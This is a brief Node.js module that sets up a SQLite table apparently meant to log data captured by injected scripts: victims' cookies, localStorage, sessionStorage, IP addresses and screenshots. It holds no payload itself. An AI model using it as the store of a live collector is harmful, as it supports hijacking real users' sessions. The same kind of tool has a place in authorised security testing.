const sqlite3 = require('sqlite3').verbose();
const db = new sqlite3.Database('./injection_events.db', (err) => {
  if (err) console.error('Failed to connect to DB:', err);
  else console.log('Connected to SQLite DB');
});

db.serialize(() => {
  db.run(`
    CREATE TABLE IF NOT EXISTS payloads (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      url TEXT,
      referer TEXT,
      userAgent TEXT,
      screenResolution TEXT,
      cookies TEXT,
      localStorage TEXT,
      sessionStorage TEXT,
      publicIPv4 TEXT,
      screenshot TEXT,
      ip TEXT,
      time TEXT
    )
  `, (err) => {
    if (err) console.error('Failed to create table:', err);
  });
});

module.exports = db;